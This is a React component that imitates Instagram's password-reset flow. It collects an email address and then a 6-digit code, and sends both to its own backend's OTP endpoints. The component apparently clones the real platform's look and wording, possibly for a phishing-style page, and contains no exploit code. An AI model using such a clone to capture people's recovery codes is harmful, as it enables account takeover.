import { useState, useEffect, useCallback, useRef } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "../../components/footer/Footer";
import InstagramEndpoints from "../../services/api-endpoints";

// ─── Validation ───────────────────────────────────────────────────────────────

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function validateEmail(raw) {
  const v = raw.trim();
  if (!v)               return "Email address is required.";
  if (!v.includes("@")) return "Enter a valid email address.";
  if (!EMAIL_RE.test(v)) return "That doesn't look like a valid email address.";
  return "";
}

function validateOtp(raw) {
  const v = raw.trim();
  if (!v)               return "Please enter the confirmation code.";
  if (!/^\d+$/.test(v)) return "Code must contain digits only.";
  if (v.length !== 6)   return "Code must be exactly 6 digits.";
  return "";
}

// ─── Shared shell ─────────────────────────────────────────────────────────────

function PageShell({ children }) {
  return (
    <div className="min-h-screen flex flex-col bg-white text-[#262626] font-sans">
      <main className="flex-1 flex items-start justify-center px-6 pt-10 pb-8">
        <div className="w-full max-w-[500px]">{children}</div>
      </main>
      <Footer />
    </div>
  );
}

// ─── Back arrow ───────────────────────────────────────────────────────────────

function BackBtn({ onClick }) {
  return (
    <button
      type="button"
      onClick={onClick}
      aria-label="Go back"
      className="mb-7 text-[#262626] hover:text-[#737373] transition-colors cursor-pointer"
    >
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
        strokeWidth={2.2} strokeLinecap="round" strokeLinejoin="round"
        className="w-5 h-5">
        <polyline points="15 18 9 12 15 6" />
      </svg>
    </button>
  );
}

// ─── Inline field error ───────────────────────────────────────────────────────

function FieldError({ id, msg }) {
  if (!msg) return null;
  return (
    <p id={id} role="alert" className="mt-1.5 ml-1 text-xs text-red-500 flex items-center gap-1">
      <svg viewBox="0 0 20 20" fill="currentColor" className="w-3.5 h-3.5 shrink-0">
        <path fillRule="evenodd"
          d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0zm-8-5a.75.75 0 0 1 .75.75v4.5a.75.75 0 0 1-1.5 0v-4.5A.75.75 0 0 1 10 5zm0 8.25a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"
          clipRule="evenodd" />
      </svg>
      {msg}
    </p>
  );
}

// ─── Inline button spinner ────────────────────────────────────────────────────

function Spinner() {
  return (
    <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.35)" strokeWidth="3" />
      <path d="M22 12a10 10 0 0 0-10-10" stroke="white" strokeWidth="3" strokeLinecap="round" />
    </svg>
  );
}

// ─── Mask email: first 5 chars + *** + @domain ────────────────────────────────

function maskEmail(email) {
  const at = email.indexOf("@");
  if (at < 0) return email;
  const local  = email.slice(0, at);
  const domain = email.slice(at);          // includes @
  const show   = local.slice(0, Math.min(5, local.length));
  return show + "***" + domain;
}

// ─── 30 s resend countdown hook ───────────────────────────────────────────────

function useResendTimer(startImmediately = true) {
  const TOTAL = 30;
  const [secs, setSecs]   = useState(startImmediately ? TOTAL : 0);
  const timerRef          = useRef(null);

  const start = useCallback(() => {
    setSecs(TOTAL);
  }, []);

  useEffect(() => {
    if (secs <= 0) { clearInterval(timerRef.current); return; }
    timerRef.current = setInterval(() => setSecs(s => s - 1), 1000);
    return () => clearInterval(timerRef.current);
  }, [secs]);

  return { secs, start, active: secs > 0 };
}

// ─── Step 1 — Find your account ───────────────────────────────────────────────

function StepFind({ onContinue, onBack }) {
  const [email,   setEmail]   = useState("");
  const [error,   setError]   = useState("");
  const [touched, setTouched] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    setEmail(e.target.value);
    if (touched) setError(validateEmail(e.target.value));
  };

  const handleBlur = () => {
    setTouched(true);
    setError(validateEmail(email));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setTouched(true);
    const err = validateEmail(email);
    setError(err);
    if (err) return;

    setLoading(true);
    fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/otp/send`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ email: email.trim() }),
    })
      .then(r => r.json())
      .then(json => {
        setLoading(false);
        if (json.status !== 'SUCCESS') {
          setTouched(true);
          setError(json.message || 'Failed to send OTP. Please try again.');
          return;
        }
        onContinue(email.trim());
      })
      .catch(() => {
        setLoading(false);
        setError('Network error. Please check your connection and try again.');
      });
  };

  return (
    <PageShell>
      <BackBtn onClick={onBack} />

      <h1 className="text-[22px] font-semibold leading-tight mb-1.5">
        Find your account
      </h1>
      <p className="text-[14px] text-[#262626] mb-5 leading-snug">
        Enter your email address.{" "}
        <a href={InstagramEndpoints.helpInsta} target="_blank" rel="noopener noreferrer"
          className="text-[#0064e0] hover:underline">
          Can't reset your password?
        </a>
      </p>

      <form onSubmit={handleSubmit} noValidate className="flex flex-col gap-3">
        <div className="flex flex-col">
          <input
            type="email"
            placeholder="Email address"
            value={email}
            onChange={handleChange}
            onBlur={handleBlur}
            autoFocus
            autoComplete="email"
            disabled={loading}
            aria-describedby={error ? "find-error" : undefined}
            aria-invalid={!!error}
            className={`w-full h-[52px] px-4 text-sm bg-white border rounded-xl outline-none placeholder:text-[#6b6b6b] transition-colors disabled:opacity-60 disabled:cursor-not-allowed
              ${error
                ? "border-red-500 focus:border-red-500"
                : "border-[#dbdbdb] focus:border-[#8e8e8e]"}`}
          />
          <FieldError id="find-error" msg={error} />
        </div>

        <p className="text-[12px] text-[#737373] leading-relaxed">
          You may receive an email or SMS for OTP confirmation.
        </p>

        <button
          type="submit"
          disabled={loading}
          className="w-full h-[46px] rounded-full bg-[#0064e0] hover:bg-[#0057c2] active:bg-[#004db5] disabled:opacity-80 text-white text-[15px] font-medium cursor-pointer disabled:cursor-not-allowed transition-colors inline-flex items-center justify-center gap-2"
        >
          {loading ? <><Spinner /><span>Finding…</span></> : "Continue"}
        </button>
      </form>

      <div className="flex items-center gap-3 my-5">
        <div className="flex-1 h-px bg-[#dbdbdb]" />
        <span className="text-xs text-[#737373] font-semibold tracking-wider uppercase">OR</span>
        <div className="flex-1 h-px bg-[#dbdbdb]" />
      </div>

      <button type="button" onClick={onBack} disabled={loading}
        className="w-full h-[46px] rounded-full border border-[#dbdbdb] text-[#262626] text-[15px] font-medium hover:bg-[#f5f5f5] cursor-pointer disabled:opacity-60 disabled:cursor-not-allowed transition-colors">
        Back to login
      </button>
    </PageShell>
  );
}

// ─── Step 2 — OTP entry ───────────────────────────────────────────────────────

function StepOtp({ identifier, onBack, onSuccess }) {
  const [otp,        setOtp]        = useState("");
  const [error,      setError]      = useState("");
  const [touched,    setTouched]    = useState(false);
  const [confirming, setConfirming] = useState(false);
  const [resending,  setResending]  = useState(false);

  const resend = useResendTimer(true);  // starts 30 s countdown immediately on mount
  const masked = maskEmail(identifier);

  const handleChange = (e) => {
    const v = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(v);
    if (touched) setError(validateOtp(v));
  };

  const handleBlur = () => {
    setTouched(true);
    setError(validateOtp(otp));
  };

  const handleResend = () => {
    setResending(true);
    fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/otp/send`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ email: identifier }),
    })
      .then(r => r.json())
      .then(() => {
        setResending(false);
        setOtp("");
        setError("");
        setTouched(false);
        resend.start();
      })
      .catch(() => {
        setResending(false);
        setError("Failed to resend. Please try again.");
      });
  };

  const handleSubmit = useCallback((e) => {
    e.preventDefault();
    setTouched(true);
    const err = validateOtp(otp);
    setError(err);
    if (err) return;

    setConfirming(true);
    fetch(`${InstagramEndpoints.backendBaseUrl}/api/instagram/otp/verify`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ email: identifier, otp }),
    })
      .then(r => r.json())
      .then(json => {
        setConfirming(false);
        if (json.status !== 'SUCCESS') {
          setError("Invalid code. Please check and try again.");
          setOtp("");
          return;
        }
        onSuccess();
      })
      .catch(() => {
        setConfirming(false);
        setError("Invalid code. Please check and try again.");
      });
  }, [otp, identifier, onSuccess]);

  return (
    <PageShell>
      {/* Back arrow → back to StepFind */}
      <BackBtn onClick={() => onBack("find")} />

      {/* Lock icon */}
      <div className="flex items-center justify-center w-14 h-14 rounded-full border-2 border-[#262626] mb-5">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
          strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round"
          className="w-6 h-6">
          <rect x="3" y="11" width="18" height="11" rx="2" />
          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
        </svg>
      </div>

      <h1 className="text-[22px] font-semibold leading-tight mb-1.5">
        Enter confirmation code
      </h1>
      <p className="text-[14px] text-[#737373] mb-6 leading-snug">
        Enter the 6-digit code sent to{" "}
        <span className="font-semibold text-[#262626]">{masked}</span>.{" "}
        <button
          type="button"
          onClick={() => onBack("find")}
          className="text-[#0064e0] hover:underline font-medium cursor-pointer"
        >
          Change
        </button>
      </p>

      <form onSubmit={handleSubmit} noValidate className="flex flex-col gap-3">
        <div className="flex flex-col">
          <input
            type="text"
            inputMode="numeric"
            placeholder="6-digit code"
            value={otp}
            onChange={handleChange}
            onBlur={handleBlur}
            autoFocus
            maxLength={6}
            autoComplete="one-time-code"
            disabled={confirming}
            aria-describedby={error ? "otp-error" : undefined}
            aria-invalid={!!error}
            className={`w-full h-[52px] px-4 text-sm tracking-[0.25em] bg-white border rounded-xl outline-none placeholder:text-[#6b6b6b] placeholder:tracking-normal transition-colors disabled:opacity-60 disabled:cursor-not-allowed
              ${error
                ? "border-red-500 focus:border-red-500"
                : "border-[#dbdbdb] focus:border-[#8e8e8e]"}`}
          />
          <FieldError id="otp-error" msg={error} />
        </div>

        {/* Notice + resend inline on same line */}
        <p className="text-[12px] text-[#737373] leading-relaxed">
          You may receive an email or SMS for OTP confirmation. Check your spam or junk folder if you don't see it.{" "}
          <button
            type="button"
            onClick={handleResend}
            disabled={resend.active || confirming || resending}
            className={`font-medium transition-colors cursor-pointer disabled:cursor-not-allowed
              ${resend.active || confirming || resending
                ? "text-[#aaaaaa]"
                : "text-[#0064e0] hover:underline"
              }`}
          >
            {resending
              ? "Sending…"
              : resend.active
                ? `Resend code in ${resend.secs}s`
                : "Resend code"}
          </button>
        </p>

        <button
          type="submit"
          disabled={confirming}
          className="w-full h-[46px] rounded-full bg-[#0064e0] hover:bg-[#0057c2] active:bg-[#004db5] disabled:opacity-80 text-white text-[15px] font-medium cursor-pointer disabled:cursor-not-allowed transition-colors inline-flex items-center justify-center gap-2"
        >
          {confirming ? <><Spinner /><span>Confirming…</span></> : "Continue"}
        </button>
      </form>

      <div className="flex items-center gap-3 my-5">
        <div className="flex-1 h-px bg-[#dbdbdb]" />
        <span className="text-xs text-[#737373] font-semibold tracking-wider uppercase">OR</span>
        <div className="flex-1 h-px bg-[#dbdbdb]" />
      </div>

      {/* "Back to login" → goes all the way home */}
      <button type="button" onClick={() => onBack("home")} disabled={confirming}
        className="w-full h-[46px] rounded-full border border-[#dbdbdb] text-[#262626] text-[15px] font-medium hover:bg-[#f5f5f5] cursor-pointer disabled:opacity-60 disabled:cursor-not-allowed transition-colors">
        Back to login
      </button>
    </PageShell>
  );
}

// ─── Root controller ──────────────────────────────────────────────────────────

const Forgot = () => {
  const navigate = useNavigate();

  const [step,       setStep]       = useState("find");
  const [identifier, setIdentifier] = useState("");

  const handleFound   = (email) => { setIdentifier(email); setStep("otp"); };
  const handleSuccess = ()      => navigate("/");

  // "find"  → go back to StepFind
  // "home"  → navigate to login
  const handleOtpBack = (dest) => {
    if (dest === "home") navigate("/");
    else setStep("find");
  };

  if (step === "find")
    return <StepFind onContinue={handleFound} onBack={() => navigate("/")} />;

  return (
    <StepOtp
      identifier={identifier}
      onBack={handleOtpBack}
      onSuccess={handleSuccess}
    />
  );
};

export default Forgot;
